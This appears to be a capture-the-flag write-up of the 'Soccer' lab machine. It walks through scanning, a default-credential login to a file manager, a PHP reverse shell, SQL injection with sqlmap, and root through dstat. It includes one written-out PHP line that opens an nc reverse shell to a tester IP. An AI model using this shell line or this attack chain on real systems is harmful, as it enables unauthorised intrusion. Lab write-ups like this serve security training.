+++
title = 'Soccer'
description = 'Easy Linux'
writeup = true
hideMeta = true
+++

nmap scan.

![Soccer (Easy Linux).png](Soccer%20%28Easy%20Linux%29.png)

Port 80 - the page doesn't seem to load at all. Port 9091 - GET/OPTIONS/POST/TRACE all fail.

The nmap output shows SSH and nginx versions. The nginx version is old but doesn't appear to have an RCE exploit.

![Soccer (Easy Linux)-1.png](Soccer%20%28Easy%20Linux%29-1.png)

ffuf reveals a directory: `tiny`.

It turns out this was the reason the browser was hanging:

![Soccer (Easy Linux)-2.png](Soccer%20%28Easy%20Linux%29-2.png)

The main site is completely static - going to `/tiny` there's a login portal.

![Soccer (Easy Linux)-3.png](Soccer%20%28Easy%20Linux%29-3.png)

Credentials are in the GitHub README.

![Soccer (Easy Linux)-4.png](Soccer%20%28Easy%20Linux%29-4.png)

Logged in.

![Soccer (Easy Linux)-5.png](Soccer%20%28Easy%20Linux%29-5.png)

![Soccer (Easy Linux)-6.png](Soccer%20%28Easy%20Linux%29-6.png)

It's the web root of the site and it's PHP, so we can get a shell.

![Soccer (Easy Linux)-7.png](Soccer%20%28Easy%20Linux%29-7.png)

```php
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 80 >/tmp/f");
```

![Soccer (Easy Linux)-8.png](Soccer%20%28Easy%20Linux%29-8.png)
![Soccer (Easy Linux)-9.png](Soccer%20%28Easy%20Linux%29-9.png)
![Soccer (Easy Linux)-10.png](Soccer%20%28Easy%20Linux%29-10.png)

The site also has boolean-based SQLi.

![Soccer (Easy Linux)-11.png](Soccer%20%28Easy%20Linux%29-11.png)

Using sqlmap on `soccer_db` gives `player@player.htb` with password `PlayerOftheMatch2022`.

The password works for the `player` user over SSH.

![Soccer (Easy Linux)-12.png](Soccer%20%28Easy%20Linux%29-12.png)

Ran linpeas.

![Soccer (Easy Linux)-13.png](Soccer%20%28Easy%20Linux%29-13.png)

![Soccer (Easy Linux)-14.png](Soccer%20%28Easy%20Linux%29-14.png)

We can execute `dstat` as root - GTFO bins shows how to abuse this to elevate privileges.

![Soccer (Easy Linux)-15.png](Soccer%20%28Easy%20Linux%29-15.png)

Root shell.
